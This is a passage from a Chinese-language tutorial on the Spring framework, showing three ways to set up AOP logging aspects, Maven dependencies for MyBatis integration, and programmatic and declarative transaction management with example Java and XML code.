class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.log;<br><br><span class="hljs-keyword">import</span> org.springframework.aop.MethodBeforeAdvice;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Log</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">MethodBeforeAdvice</span> &#123;<br><br>    <span class="hljs-comment">//method: 要执行的目标对象的方法</span><br>    <span class="hljs-comment">//args: 参数</span><br>    <span class="hljs-comment">//target(o): 目标读写</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">before</span><span class="hljs-params">(Method method, Object[] objects, Object o)</span> <span class="hljs-keyword">throws</span> Throwable &#123;<br>        System.out.println(o.getClass().getName()+<span class="hljs-string">&quot;的&quot;</span>+method.getName()+<span class="hljs-string">&quot;被执行了&quot;</span>);<br><br>    &#125;<br>&#125;<br><span class="hljs-keyword">package</span> com.kuang.log;<br><br><span class="hljs-keyword">import</span> org.springframework.aop.AfterReturningAdvice;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AfterLog</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">AfterReturningAdvice</span> &#123;<br><br>    <span class="hljs-comment">//returnValue;返回值</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">afterReturning</span><span class="hljs-params">(Object returnValue, Method method, Object[] args, Object target)</span> <span class="hljs-keyword">throws</span> Throwable &#123;<br>        System.out.println(<span class="hljs-string">&quot;执行了&quot;</span>+method.getName()+<span class="hljs-string">&quot;方法，返回结果为：&quot;</span>+returnValue );<br>    &#125;<br>&#125;<br>&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;<br>&lt;beans xmlns=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span><br>  xmlns:xsi=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br>  xmlns:aop=<span class="hljs-string">&quot;http://www.springframework.org/schema/aop&quot;</span><br>  xsi:schemaLocation=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans</span><br><span class="hljs-string">  http://www.springframework.org/schema/beans/spring-beans.xsd</span><br><span class="hljs-string">  http://www.springframework.org/schema/aop</span><br><span class="hljs-string">  http://www.springframework.org/schema/aop/spring-aop.xsd&quot;</span>&gt;<br><br>  &lt;!--注册 beans--&gt;<br>  &lt;bean id=<span class="hljs-string">&quot;userService&quot;</span> class=<span class="hljs-string">&quot;com.kuang.service.UserServiceImpl&quot;</span>/&gt;<br>  &lt;bean id=<span class="hljs-string">&quot;log&quot;</span> class=<span class="hljs-string">&quot;com.kuang.log.Log&quot;</span>/&gt;<br>  &lt;bean id=<span class="hljs-string">&quot;afterLog&quot;</span> class=<span class="hljs-string">&quot;com.kuang.log.AfterLog&quot;</span>/&gt;<br><br>  &lt;!--方式一：使用原生 Spring API 接口--&gt;<br>  &lt;!--配置 aop: 导入 aop 约束--&gt;<br>  &lt;aop:config&gt;<br>    &lt;!--切入点：expression:表达式  execution(要执行的位置***) --&gt;<br>    &lt;aop:pointcut id=<span class="hljs-string">&quot;pointcut&quot;</span> expression=<span class="hljs-string">&quot;execution(* com.kuang.service.UserServiceImpl.*(..))&quot;</span>/&gt;<br><br>    &lt;!--执行环绕增加--&gt;<br>    &lt;aop:advisor advice-ref=<span class="hljs-string">&quot;log&quot;</span> pointcut-ref=<span class="hljs-string">&quot;pointcut&quot;</span>/&gt;<br>    &lt;aop:advisor advice-ref=<span class="hljs-string">&quot;afterLog&quot;</span> pointcut-ref=<span class="hljs-string">&quot;pointcut&quot;</span>/&gt;<br>  &lt;/aop:config&gt;<br><br>&lt;/beans&gt;<br><span class="hljs-keyword">import</span> com.kuang.service.UserService;<br><span class="hljs-keyword">import</span> org.springframework.context.ApplicationContext;<br><span class="hljs-keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassPathXmlApplicationContext</span>(<span class="hljs-string">&quot;applicationContext.xml&quot;</span>);<br>        <span class="hljs-comment">//动态代理的是接口</span><br>        <span class="hljs-type">UserService</span> <span class="hljs-variable">userService</span> <span class="hljs-operator">=</span> context.getBean(<span class="hljs-string">&quot;userService&quot;</span>, UserService.class);<br><br>        userService.add();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202510311753241.png" alt="img"></p><h5 id="第二种方式：自定义类来实现Aop"><a href="#第二种方式：自定义类来实现Aop" class="headerlink" title="第二种方式：自定义类来实现Aop"></a>第二种方式：<strong>自定义类来实现Aop</strong></h5><p>目标业务类不变依旧是userServiceImpl</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.diy;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DiyPointCut</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">before</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;========方法执行前========&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">after</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;========方法执行后========&quot;</span>);<br>    &#125;<br>&#125;<br>&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;<br>&lt;beans xmlns=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span><br>  xmlns:xsi=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br>  xmlns:aop=<span class="hljs-string">&quot;http://www.springframework.org/schema/aop&quot;</span><br>  xsi:schemaLocation=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans</span><br><span class="hljs-string">  http://www.springframework.org/schema/beans/spring-beans.xsd</span><br><span class="hljs-string">  http://www.springframework.org/schema/aop</span><br><span class="hljs-string">  http://www.springframework.org/schema/aop/spring-aop.xsd&quot;</span>&gt;<br><br>  &lt;!--注册 beans--&gt;<br>  &lt;bean id=<span class="hljs-string">&quot;userService&quot;</span> class=<span class="hljs-string">&quot;com.kuang.service.UserServiceImpl&quot;</span>/&gt;<br>  &lt;bean id=<span class="hljs-string">&quot;log&quot;</span> class=<span class="hljs-string">&quot;com.kuang.log.Log&quot;</span>/&gt;<br>  &lt;bean id=<span class="hljs-string">&quot;afterLog&quot;</span> class=<span class="hljs-string">&quot;com.kuang.log.AfterLog&quot;</span>/&gt;<br><br>  &lt;!--    &amp;lt;!&amp;ndash;方式一：使用原生 Spring API 接口&amp;ndash;&amp;gt;--&gt;<br>  &lt;!--    &amp;lt;!&amp;ndash;配置 aop: 导入 aop 约束&amp;ndash;&amp;gt;--&gt;<br>  &lt;!--    &lt;aop:config&gt;--&gt;<br>  &lt;!--        &amp;lt;!&amp;ndash;切入点：expression:表达式  execution(要执行的位置***) &amp;ndash;&amp;gt;--&gt;<br>  &lt;!--        &lt;aop:pointcut id=<span class="hljs-string">&quot;pointcut&quot;</span> expression=<span class="hljs-string">&quot;execution(* com.kuang.service.UserServiceImpl.*(..))&quot;</span>/&gt;--&gt;<br><br>  &lt;!--        &amp;lt;!&amp;ndash;执行环绕增加&amp;ndash;&amp;gt;--&gt;<br>  &lt;!--        &lt;aop:advisor advice-ref=<span class="hljs-string">&quot;log&quot;</span> pointcut-ref=<span class="hljs-string">&quot;pointcut&quot;</span>/&gt;--&gt;<br>  &lt;!--        &lt;aop:advisor advice-ref=<span class="hljs-string">&quot;afterLog&quot;</span> pointcut-ref=<span class="hljs-string">&quot;pointcut&quot;</span>/&gt;--&gt;<br>  &lt;!--    &lt;/aop:config&gt;--&gt;<br><br>  &lt;!--方式二：自定义类--&gt;<br>  &lt;bean id=<span class="hljs-string">&quot;diy&quot;</span> class=<span class="hljs-string">&quot;com.kuang.diy.DiyPointCut&quot;</span>/&gt;<br>  &lt;aop:config&gt;<br>    &lt;!--自定义切面，ref 要引用的类--&gt;<br>    &lt;aop:aspect ref=<span class="hljs-string">&quot;diy&quot;</span>&gt;<br>      &lt;!--切入点--&gt;<br>      &lt;aop:pointcut id=<span class="hljs-string">&quot;diyPonitcut&quot;</span> expression=<span class="hljs-string">&quot;execution(* com.kuang.service.UserServiceImpl.*(..))&quot;</span>/&gt;<br>      &lt;!--通知--&gt;<br>      &lt;aop:before pointcut-ref=<span class="hljs-string">&quot;diyPonitcut&quot;</span> method=<span class="hljs-string">&quot;before&quot;</span>/&gt;<br>      &lt;aop:after pointcut-ref=<span class="hljs-string">&quot;diyPonitcut&quot;</span> method=<span class="hljs-string">&quot;after&quot;</span>/&gt;<br>    &lt;/aop:aspect&gt;<br>  &lt;/aop:config&gt;<br><br><br>&lt;/beans&gt;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202510311749050.png" alt="img"></p><h5 id="第三种方式：-使用注解实现"><a href="#第三种方式：-使用注解实现" class="headerlink" title="第三种方式： 使用注解实现"></a>第三种方式： 使用注解实现</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.diy;<br><br><span class="hljs-keyword">import</span> org.aspectj.lang.ProceedingJoinPoint;<br><span class="hljs-keyword">import</span> org.aspectj.lang.annotation.After;<br><span class="hljs-keyword">import</span> org.aspectj.lang.annotation.Around;<br><span class="hljs-keyword">import</span> org.aspectj.lang.annotation.Aspect;<br><span class="hljs-keyword">import</span> org.aspectj.lang.annotation.Before;<br><br><span class="hljs-comment">//标注这个类是一个切面</span><br><span class="hljs-meta">@Aspect</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AnnotationPointCut</span> &#123;<br><br>    <span class="hljs-meta">@Before(&quot;execution(* com.kuang.service.UserServiceImpl.*(..))&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">before</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;========方法执行前========&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@After(&quot;execution(* com.kuang.service.UserServiceImpl.*(..))&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">after</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;========方法执行后========&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">//在环绕增强中，我们可以给定一个参数，代表我们要获取处理切入的点</span><br>    <span class="hljs-meta">@Around(&quot;execution(* com.kuang.service.UserServiceImpl.*(..))&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">around</span><span class="hljs-params">(ProceedingJoinPoint jp)</span> <span class="hljs-keyword">throws</span> Throwable &#123;<br>        System.out.println(<span class="hljs-string">&quot;环绕前&quot;</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">proceed</span> <span class="hljs-operator">=</span> jp.proceed();<br>        System.out.println(<span class="hljs-string">&quot;环绕后&quot;</span>);<br>    &#125;<br>&#125;<br>&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;<br>&lt;beans xmlns=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span><br>  xmlns:xsi=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br>  xmlns:aop=<span class="hljs-string">&quot;http://www.springframework.org/schema/aop&quot;</span><br>  xsi:schemaLocation=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans</span><br><span class="hljs-string">  http://www.springframework.org/schema/beans/spring-beans.xsd</span><br><span class="hljs-string">  http://www.springframework.org/schema/aop</span><br><span class="hljs-string">  http://www.springframework.org/schema/aop/spring-aop.xsd&quot;</span>&gt;<br>  &lt;!--方式三--&gt;<br>  &lt;bean id=<span class="hljs-string">&quot;annotationPointcut&quot;</span> class=<span class="hljs-string">&quot;com.kuang.diy.AnnotationPointCut&quot;</span>/&gt;<br>  &lt;!--开启注解支持--&gt;<br>  &lt;aop:aspectj-autoproxy/&gt;<br>&lt;/beans&gt;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202510311749165.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202510311753944.png" alt="img"></p><h1 id="5、整合-Mybatis（暂时跳过）"><a href="#5、整合-Mybatis（暂时跳过）" class="headerlink" title="5、整合 Mybatis（暂时跳过）"></a>5、整合 Mybatis（暂时跳过）</h1><h3 id="5-1-1-导入相关-jar-包"><a href="#5-1-1-导入相关-jar-包" class="headerlink" title="5.1.1 导入相关 jar 包"></a>5.1.1 导入相关 jar 包</h3><p>(版本可以根据最新版调整)</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>junit<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>junit<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.12<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.mybatis<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mybatis<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.5.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>mysql<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mysql-connector-java<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>5.1.47<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-webmvc<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>5.1.10.RELEASE<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-jdbc<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>5.1.10.RELEASE<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/org.aspectj/aspectjweaver --&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.aspectj<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>aspectjweaver<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.9.4<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.mybatis<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mybatis-spring<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.0.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure><h1 id="6、声明式事务"><a href="#6、声明式事务" class="headerlink" title="6、声明式事务"></a>6、声明式事务</h1><h2 id="6-1-回顾事务"><a href="#6-1-回顾事务" class="headerlink" title="6.1 回顾事务"></a>6.1 回顾事务</h2><p><strong>事务是逻辑上的一组操作，要么都执行，要么都不执行</strong></p><ul><li>把一组业务当成一个业务来做，<strong>要么都成功，要么都失败</strong>。</li><li>事务在项目开发过程非常重要，涉及到数据的一致性的问题，不容马虎！</li><li>事务管理是企业级应用程序开发中必备技术，用来确保数据的完整性和一致性。</li></ul><p><strong>事务 ACID 原则</strong></p><ol><li>原子性（atomicity）</li></ol><ul><li><ul><li>事务是原子性操作，由一系列动作组成，事务的原子性确保动作要么全部完成，要么完全不起作用</li></ul></li></ul><ol><li>一致性（consistency）</li></ol><ul><li><ul><li>一旦所有事务动作完成，事务就要被提交。数据和资源处于一种满足业务规则的一致性状态中</li></ul></li></ul><ol><li>隔离性（isolation）</li></ol><ul><li><ul><li>可能多个事务会同时处理相同的数据，因此每个事务都应该与其他事务隔离开来，防止数据损坏</li></ul></li></ul><ol><li>持久性（durability）</li></ol><ul><li><ul><li>事务一旦完成，无论系统发生什么错误，结果都不会受到影响。通常情况下，事务的结果被写到持久化存储器中</li></ul></li></ul><p> <strong>A、I、D 是手段，C 是目的！</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202510311749286.png" alt="img"></p><h2 id="6-2-Spring中的事务管理"><a href="#6-2-Spring中的事务管理" class="headerlink" title="6.2 Spring中的事务管理"></a>6.2 Spring中的事务管理</h2><h3 id="6-2-1-Spring-支持的俩种事务管理方式"><a href="#6-2-1-Spring-支持的俩种事务管理方式" class="headerlink" title="6.2.1 Spring 支持的俩种事务管理方式"></a>6.2.1 Spring 支持的俩种事务管理方式</h3><h4 id="编程式事务管理"><a href="#编程式事务管理" class="headerlink" title="编程式事务管理"></a>编程式事务管理</h4><p> 在代码中手动控制事务的开启、提交和回滚，灵活但耦合业务代码和事务逻辑</p><p>使用<code>TransactionTemplate</code> 进行编程式事务管理的示例代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Autowired</span><br><span class="hljs-keyword">private</span> TransactionTemplate transactionTemplate;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testTransaction</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-comment">//调用 transactionTemplate.execute() 开始事务执行</span><br>        transactionTemplate.execute(<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransactionCallbackWithoutResult</span>() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-comment">//传入回调 TransactionCallbackWithoutResult，回调中写业务逻辑，transactionStatus 对象表示当前事务的状态，可以用来设置回滚</span><br>            <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doInTransactionWithoutResult</span><span class="hljs-params">(TransactionStatus transactionStatus)</span> &#123;<br><br>                <span class="hljs-keyword">try</span> &#123;<br><br>                    <span class="hljs-comment">// ....  业务代码</span><br>                &#125; <span class="hljs-keyword">catch</span> (Exception e)&#123;<br>                    <span class="hljs-comment">//回滚</span><br>                    <span class="hljs-comment">//如果出现异常，调用 transactionStatus.setRollbackOnly()，标记事务为回滚状态</span><br>                    transactionStatus.setRollbackOnly();<br>                &#125;<br><br>            &#125;<br>        &#125;);<br>&#125;<br></code></pre></td></tr></table></figure><p>使用 <code>TransactionManager</code> 进行编程式事务管理的示例代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Autowired</span><br><span class="hljs-comment">//PlatformTransactionManager 可以手动开启、提交、回滚事务</span><br><span class="hljs-keyword">private</span> PlatformTransactionManager transactionManager;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testTransaction</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-comment">//调用 getTransaction() 开启一个事务，返回事务状态对象 status。</span><br>    <span class="hljs-comment">//DefaultTransactionDefinition() 是事务配置，这里使用默认值：传播行为：PROPAGATION_REQUIRED；隔离级别：ISOLATION_DEFAULT</span><br>    <span class="hljs-type">TransactionStatus</span> <span class="hljs-variable">status</span> <span class="hljs-operator">=</span> transactionManager.getTransaction(<span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultTransactionDefinition</span>());<br>          <span class="hljs-keyword">try</span> &#123;<br>               <span class="hljs-comment">// ....  业务代码</span><br>              <span class="hljs-comment">//执行成功-调用 transactionManager.commit(status) 提交事务</span><br>              transactionManager.commit(status);<br>          &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>              <span class="hljs-comment">//捕获异常-调用 transactionManager.rollback(status) 回滚事务</span><br>              transactionManager.rollback(status);<br>          &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="声明式事务管理"><a href="#声明式事务管理" class="headerlink" title="声明式事务管理"></a>声明式事务管理</h4><p>使用<code>@Transactional</code>注解或 XML 配置， Spring AOP 自动管理事务  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td 